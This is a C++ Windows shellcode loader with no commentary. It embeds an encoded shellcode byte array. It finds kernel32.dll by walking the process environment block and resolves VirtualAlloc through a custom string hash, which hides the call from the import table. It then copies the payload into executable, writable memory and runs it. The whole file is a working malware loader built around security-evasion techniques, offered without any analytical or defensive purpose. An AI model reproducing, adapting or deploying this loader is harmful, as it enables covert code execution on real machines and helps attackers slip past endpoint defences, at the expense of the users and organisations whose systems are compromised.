#include <Windows.h>
#include <iostream>
//#include<winternl.h>
#include"Header.h"
using namespace std;


unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xc8\xaf\x1c\xb9\xe4\xbe\x9e\xd6\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x34\xe7\x9f"
"\x5d\x14\x56\x5e\xd6\xc8\xaf\x5d\xe8\xa5\xee\xcc\x87\x9e"
"\xe7\x2d\x6b\x81\xf6\x15\x84\xa8\xe7\x97\xeb\xfc\xf6\x15"
"\x84\xe8\xe7\x97\xcb\xb4\xf6\x91\x61\x82\xe5\x51\x88\x2d"
"\xf6\xaf\x16\x64\x93\x7d\xc5\xe6\x92\xbe\x97\x09\x66\x11"
"\xf8\xe5\x7f\x7c\x3b\x9a\xee\x4d\xf1\x6f\xec\xbe\x5d\x8a"
"\x93\x54\xb8\x34\x35\x1e\x5e\xc8\xaf\x1c\xf1\x61\x7e\xea"
"\xb1\x80\xae\xcc\xe9\x6f\xf6\x86\x92\x43\xef\x3c\xf0\xe5"
"\x6e\x7d\x80\x80\x50\xd5\xf8\x6f\x8a\x16\x9e\xc9\x79\x51"
"\x88\x2d\xf6\xaf\x16\x64\xee\xdd\x70\xe9\xff\x9f\x17\xf0"
"\x4f\x69\x48\xa8\xbd\xd2\xf2\xc0\xea\x25\x68\x91\x66\xc6"
"\x92\x43\xef\x38\xf0\xe5\x6e\xf8\x97\x43\xa3\x54\xfd\x6f"
"\xfe\x82\x9f\xc9\x7f\x5d\x32\xe0\x36\xd6\xd7\x18\xee\x44"
"\xf8\xbc\xe0\xc7\x8c\x89\xf7\x5d\xe0\xa5\xe4\xd6\x55\x24"
"\x8f\x5d\xeb\x1b\x5e\xc6\x97\x91\xf5\x54\x32\xf6\x57\xc9"
"\x29\x37\x50\x41\xf0\x5a\xc9\xed\xe4\x97\x9c\x2e\xb9\xe4"
"\xff\xc8\x9f\x41\x49\x54\x38\x08\x1e\x9f\xd6\xc8\xe6\x95"
"\x5c\xad\x02\x9c\xd6\xeb\x86\xdc\x11\x20\x37\xdf\x82\x81"
"\x26\xf8\xf5\x6d\x4f\xdf\x6c\x84\xd8\x3a\xbe\x1b\x6b\xd2"
"\x5f\x22\xc7\x1d\xb8\xe4\xbe\xc7\x97\x72\x86\x9c\xd2\xe4"
"\x41\x4b\x86\x98\xe2\x2d\x70\xa9\x8f\x5e\x9e\x37\x6f\x54"
"\x30\x26\xf6\x61\x16\x80\x26\xdd\xf8\x5e\x54\x91\x09\x28"
"\x50\xc9\xf1\x6d\x79\xf4\xc6\x89\xf7\x50\x30\x06\xf6\x17"
"\x2f\x89\x15\x85\x1c\x90\xdf\x61\x03\x80\x2e\xd8\xf9\xe6"
"\xbe\x9e\x9f\x70\xcc\x71\xdd\xe4\xbe\x9e\xd6\xc8\xee\x4c"
"\xf8\xb4\xf6\x17\x34\x9f\xf8\x4b\xf4\xd5\x7e\xf4\xdb\x91"
"\xee\x4c\x5b\x18\xd8\x59\x92\xec\xfb\x1d\xb8\xac\x33\xda"
"\xf2\xd0\x69\x1c\xd1\xac\x37\x78\x80\x98\xee\x4c\xf8\xb4"
"\xff\xce\x9f\x37\x6f\x5d\xe9\xad\x41\x56\x9b\x41\x6e\x50"
"\x30\x25\xff\x24\xaf\x04\x90\x9a\x46\x31\xf6\xaf\x04\x80"
"\x50\xd6\x32\xea\xff\x24\xde\x4f\xb2\x7c\x46\x31\x05\x6e"
"\x63\x6a\xf9\x5d\x03\x42\x2b\x23\x4b\x37\x7a\x54\x3a\x20"
"\x96\xa2\xd0\xb4\xa5\x9c\x42\x04\xcb\x9b\x6d\x8f\xbc\x6e"
"\xd6\x8e\xbe\xc7\x97\x41\x75\xe3\x6c\xe4\xbe\x9e\xd6";




//PVOID Get_addr(HMODULE hmodule, LPCSTR lpApiName) {
//    PBYTE pBase = (PBYTE)hmodule;
//
//    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pBase;
//    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pBase + dos->e_lfanew);
//    IMAGE_OPTIONAL_HEADER option = nt->OptionalHeader;
//
//    PIMAGE_EXPORT_DIRECTORY Exp = (PIMAGE_EXPORT_DIRECTORY)(pBase + option.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
//
//    DWORD* funcname = (PDWORD)(pBase + Exp->AddressOfNames);
//    DWORD* funcaddr = (PDWORD)(pBase + Exp->AddressOfFunctions);
//    WORD* funcord = (PWORD)(pBase + Exp->AddressOfNameOrdinals);
//
//    for (DWORD i = 0; i < Exp->NumberOfFunctions; i++) {
//        char* names = (char*)(pBase + funcname[i]);
//        PVOID address = nullptr;
//
//        if (strcmp(names, lpApiName) == 0) {
//            address = (PVOID)(pBase + funcaddr[funcord[i]]);
//            std::cout << "[Ordinal " << funcord[i]+8 << "] NAME: " << names << " - ADDRESS: 0x" << address << std::endl;
//            return address;
//        }
//    }
//    
//}


HMODULE Get_Modulebase(IN LPCWSTR szModuleName) {
    PPEB					pPeb = (PEB*)(__readgsqword(0x60));
	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    HMODULE test = NULL;
    while (pDte) {
        if (pDte->FullDllName.Length != NULL) {
            //wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);

            if (_wcsicmp(pDte->FullDllName.Buffer, szModuleName) == 0) {
                wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
                return (HMODULE)pDte->InInitializationOrderLinks.Flink;
                //return (HMODULE)pDte->Reserved2[0];
            }			
            pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

        }
      }

	return NULL;
}




DWORD getHashFromString(char* string)
{
    size_t stringLength = strnlen_s(string, 50);
    DWORD hash = 0x45;
    for (size_t i = 0; i < stringLength; i++)
    {
        hash += (hash * 0xDeadbeef + string[i]) & 0xffffff;
    }
    return hash;
}

VOID getFunctionAddressByHash(DWORD hash,PVOID* mem) {
    PBYTE libbase = (PBYTE)Get_Modulebase(L"kernel32.dll");
    //cout << "The address of kernel32: " << libbase << endl;

    PIMAGE_DOS_HEADER dos2 = (PIMAGE_DOS_HEADER)libbase;
    PIMAGE_NT_HEADERS nt2 = (PIMAGE_NT_HEADERS)(libbase + dos2->e_lfanew);
    IMAGE_OPTIONAL_HEADER op2 = nt2->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY exp2 = (PIMAGE_EXPORT_DIRECTORY)(libbase + op2.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD funcname_addr = (PDWORD)(libbase + exp2->AddressOfNames);
    PDWORD funcaddr_addr = (PDWORD)(libbase + exp2->AddressOfFunctions);
    PWORD funcordin_addr = (PWORD)(libbase + exp2->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp2->NumberOfFunctions; i++) {
        char* funcname = (char*)(libbase + funcname_addr[i]);
        //cout << "Function name: " << funcname << endl;
        DWORD funcnamehash = getHashFromString(funcname);
        if (funcnamehash == hash) {
            cout << "[ "<< i << "] Func HASH : " << funcnamehash << endl;
            PDWORD virmem = (PDWORD)(libbase + funcaddr_addr[funcordin_addr[i]]);
            cout << "VirtualAlloc() address is: " << virmem <<endl;
            *mem = virmem;
            
        }
   
    
    }
}


using vir = PVOID(WINAPI*)(PVOID,SIZE_T ,DWORD, DWORD);

int main() {
    PVOID Virtualmem =0;
    DWORD hsh=getHashFromString((char*)"VirtualAlloc");
    getFunctionAddressByHash(hsh, &Virtualmem);
    vir custom_viralloc = (vir)Virtualmem;
    PVOID mem= custom_viralloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, buf, sizeof(buf));
    ((void(*)())mem)();
    return 0;

}